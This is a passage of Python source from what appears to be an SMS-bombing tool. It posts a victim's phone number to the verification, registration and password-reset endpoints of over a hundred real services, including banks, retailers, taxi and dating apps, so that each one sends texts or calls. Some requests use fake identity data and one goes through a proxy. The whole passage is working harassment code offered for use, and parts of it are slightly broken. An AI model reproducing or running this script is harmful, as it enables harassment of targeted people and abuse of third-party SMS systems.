            requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
            print(' [+] Cinema5 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": _phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )
            print(' [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": _phone585,
                "form[PASSWORD]": password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
            print(' [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
            print(' [+] Secunda отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
            print(' [+] rozamira-azs отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": _phone})
            print(' [-] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone})
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": "Артем",
                "CB_PHONE": _phone88})
            print(' [-] отправлено!')
        except:
            print(' [-]не отправлено!')

        try:
            requests.post("https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": _email,
                "password": password,
                "phone": _phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )
            print(' [+] отправлено!')
        except:
            print(' [-] отправлено!')

        try:
            requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": "Максим",
                "surname": "Летовал",
                "patronymic": "Максимович",
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone": _phone585,
                "email": email,
                "city": "Москва",
            },
        )
            print(' [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": _phone585},
        )
            print(' [+] Pliskov отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print(' [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        except:
            pass

        try:
            requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
        )
            print(' [+] Sms4 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://bamper.by/registration/?step=1",
            data={
                "phone": "+" + _phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )
            print(' [+] Bamper отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
            print(' [+] FriendClub отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
            data={"caller_number": _phone})
            print(' [+] SalamPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            })
            print(' [+] звонок отправлен!')
            time.sleep(0.1)
        except:
            print(' [+] не отправлен!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )
            print(' [+] Uchi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
            print(' [+] ICQ отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://shafa.ua/api/v3/graphiql', json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + _phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )
            print(' [+] Shafa отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": _email,
                "mobile_phone": _phone,
                "deliveryOption": "sms",
            },
        )
            print(' [+] Alpari отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone},
            )
            print(' [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] е отправлено!')

        try:
            requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
            print(' [+] GetMancar отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
            print(' [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print(' [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
            print(' [+] Ubki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
            print(' [+] Top-Shop отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
            print(' [+] Rendez-Vous отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
            print(' [+] Osova отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
            json={"phone_number": "+" + _phone})
            
            print(' [+] Yandex.Eda отправлено!')
            time.leep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/register",
            json={
                "phone": "+" + _phone,
                "name": "Анастасия",
                "is_terms_accepted": True,
            },
        )
            print(' [+] Izi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
            print(' [+] Izzi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
            print(' [+] Pozichka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
         
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
            print(' [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
            print(' [+] Suandshi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
            print(' [+] Makarolls отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
            print(' [+] PanPizza отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
            print(' [+] MOYO отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
            print(' [+] BelkaCar sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
            print(' [+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(' [+] Tinder sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print(' [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print(' [+] Tinkoff отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')
            
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print(' [+] Dostavista отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            print(' [+] MonoBank отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
            print(' [+] SportMaster отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
         
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            print(' [+] Alfalife отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print(' [+] KoronaPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print(' [+] BTfair отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
            print(' [+] GGbet отправлено!')
            time.sleep(0.1)
        except:
            print(' [-]  не отправлено!')
        
        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
            print(' [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print(' [+] TheLive отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
             
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] MTS sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print(' [+] MyGames sent!')
            time.sleep(0.1)
        except:
            print(' [+] error in sent!')
        
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
            print(' [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print(' [+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Kasta Не отправлено!')
            
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
            print(' [+] Mail.ru отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
            print(' [+] Creditter отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
            print(' [+] Ingos отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
            print(' [+] Admiralxxx отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print(' [+] Av отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print(' [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print(' [+] City24 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print(' [+] SushiMaster отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print(' [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
            print(' [+] Niyama отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Niyama не отправлено!')
        
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print(' [+] VSK отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            print(' [+] EasyPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print(' [+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
            print(' [+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            print(' [+] Tele2 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print(' [+] Finam отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")})
            print(' [+] MakiMaki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print(' [+] Online.ua отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print(' [+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,})
            print(' [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
                
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            print(' [+] Smart.Space отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print(' [+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
       
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone})
            print(' [+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",})
            print(' [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print(' [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
            print(' [+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
            print(' [+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print(' [+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
            print(' [+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
       
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print(' [+] Helsi отправлено!')
            time.sleep(0.1)
        except:
            print(' [+] не отправлено!')
        
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
            print(' [+] KinoLend отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print(' [+] PizzaHut sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print(' [+] Rabota sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print(' [+] Rutube sent!')
            time.sleep(0.1)
        except:
            print(' [-] Rutube in sent!')
     
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print(' [+] Citilink sent!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print(' [+] Smsint sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print(' [+] oyorooms sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
            print(' [+] MVIDEO sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print(' [+] newnext sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print(' [+] Sunlight sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print(' [+] alpari sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Invitro sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sberbank sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print(' [+] Psbank sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print(' [+] Beltelcom sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print(' [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print(' [+] KFC sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print(' [+] Yandex.Chef sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print(' [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(' [+] Delitime sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print(' [+] findclone звонок отправлен!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
            print(' [+] Guru sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(' [+] ICQ sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print(' [+] InDriver sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print(' [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] Pmsm sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print(' [+] IVI sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print(' [+] Lenta sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(' [+] Mail.ru sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(' [+] MVideo sent!')
            time.sleep(0.1)
        except:
